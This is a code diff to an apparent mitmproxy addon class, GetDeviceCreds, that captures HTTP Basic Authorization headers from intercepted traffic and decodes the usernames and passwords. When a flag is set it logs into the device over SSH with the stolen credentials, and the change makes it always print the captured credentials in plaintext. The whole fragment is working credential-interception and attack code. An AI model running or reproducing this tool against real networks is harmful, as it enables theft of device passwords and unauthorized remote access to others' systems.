@@ -51,11 +51,13 @@ class GetDeviceCreds:
             atype,creds = flow.request.headers['Authorization'].split()
             if DEBUG: print("Host: %s Type: %s Creds: %s"%(h,atype,creds))
             u,p = self.basic_auth_decode(creds)
-            if DEBUG: print("Username %s : Password %s"%(u,p))
         # Attack Via SSH
         if SSH_CONNECT and h and u and p:
             if DEBUG: print("Attacking %s:%s:%s"%(h,u,p))
             self.ssh_connect(server=h,username=u,password=p)
+        
+        # Output Credentials as they are discovered
+        print("Host: %s - Username: %s - Password: %s"%(h,u,p))
 
     # Decode Basic Authentication Base64 Encoded Credentials
     def basic_auth_decode(self, data):
